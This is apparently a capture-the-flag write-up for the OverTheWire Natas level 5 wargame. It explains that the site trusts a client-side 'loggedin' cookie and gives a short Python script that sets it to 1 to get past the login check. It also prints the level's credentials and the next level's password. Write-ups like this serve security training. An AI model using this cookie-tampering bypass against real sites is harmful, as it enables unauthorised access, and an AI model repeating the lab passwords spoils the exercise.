# Level 5

URL : http://natas5.natas.labs.overthewire.org/

#### Creds for level5

**natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**

## Solution

Vsiting natas5 homepage we get :   
Access disallowed. You are not logged in.

page source has nothing interesting, but when inspecting server response headers we see : **`Set-Cookie: loggedin=0`**.  

so, will just set the loggedin cookie to 1 and request the page

```python
import requests
# set loggedin cookie
cookie = {"loggedin": "1"}
# request page
res = requests.get("http://natas5.natas.labs.overthewire.org/", cookies=cookie, auth=('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'))
# print the response body
print(res.text)
```

and here you go:
**Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1**
